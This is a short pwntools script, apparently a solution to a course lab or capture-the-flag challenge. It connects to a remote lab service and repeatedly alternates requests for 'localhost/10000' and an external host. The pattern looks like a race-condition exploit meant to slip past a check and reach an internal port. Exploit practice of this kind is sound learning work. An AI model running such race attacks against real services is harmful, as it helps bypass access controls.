from pwn import *

conn = remote('up.zoolab.org', 10932)

for _ in range(1000):
    conn.sendline(b"g")
    conn.sendline(b"localhost/10000")
    
    conn.sendline(b"g")
    conn.sendline(b"up.zoolab.org/10000")
    
    conn.sendline(b"v")
    
conn.interactive()